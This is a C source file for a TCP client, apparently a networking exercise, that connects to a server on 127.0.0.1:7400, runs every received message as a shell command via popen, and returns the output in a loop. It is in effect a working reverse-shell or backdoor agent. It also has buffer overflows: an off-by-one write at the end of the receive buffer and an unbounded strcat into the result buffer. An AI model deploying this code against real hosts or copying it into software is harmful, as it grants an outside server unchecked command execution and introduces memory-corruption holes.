#include <arpa/inet.h>
#include <netdb.h>
#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

#include "util.h"
#define MSG_SIZE 4096
#define MYPORT 7400
#define HOSTNAME "127.0.0.1"

FILE *recv_exec_msg(int sockfd, char msg[], int msg_size) {
  /* Receive and process messages from the server */
  ssize_t bytes_received = recv(sockfd, msg, msg_size, 0);

  if (bytes_received < 0) {
    error_and_exit("Error reading from socket \n");
  } else if (bytes_received == 0) {
    error_and_exit("Server disconnected \n");
  } else {
    msg[bytes_received] = '\0'; // Null-terminate the received message
    printf("%s\n", msg);
    // Process the received  message here (e.g., execute commands)
    FILE *output_pipe = popen(msg, "r");
    if (!output_pipe) {
      error_and_exit("Error Executing Commands \n");
    }

    return output_pipe;
  }
}

int main() {
  /* Create a socket for the client */
  int sockfd = open_tcp_socket();

  /* Get server's IP address */
  struct hostent *server = gethostbyname(HOSTNAME);
  if (server == NULL) {
    error_and_exit("Error: No such host \n");
  }

  struct sockaddr_in serv_addr = {
      .sin_family = AF_INET,
      .sin_port = (in_port_t)htons(MYPORT),
      .sin_addr = *(struct in_addr *)*server->h_addr_list,
  };

  try_connect(sockfd, serv_addr);

  printf("Connected to server.\n");
  char msg[MSG_SIZE];
  char output_buffer[MSG_SIZE]; // Adjust buffer size as needed
  char result_buffer[MSG_SIZE]; // Initialize an empty string buffer

  while (1) {
    // Process the received message here (e.g., execute commands)
    FILE *output_pipe = recv_exec_msg(sockfd, msg, MSG_SIZE);
    memset(result_buffer, 0, strlen(result_buffer)); // clear result_buffer
    // Read the output of the command and send it back to the server
    while (fgets(output_buffer, sizeof(output_buffer), output_pipe) != NULL) {
      strcat(result_buffer,
             output_buffer); // Append each line to the result buffer
    }

    printf("%s \n", result_buffer);

    // Send the result buffer back to the server
    if (send(sockfd, result_buffer, strlen(result_buffer), 0) == -1) {
      pclose(output_pipe);
      error_and_exit("Error sending response to server\n");
    }

    fflush(stdout);      // Ensure the data is sent immediately
    pclose(output_pipe); // Close the output pipe
  }
  /* Close the socket */
  close(sockfd);
  return 0;
}
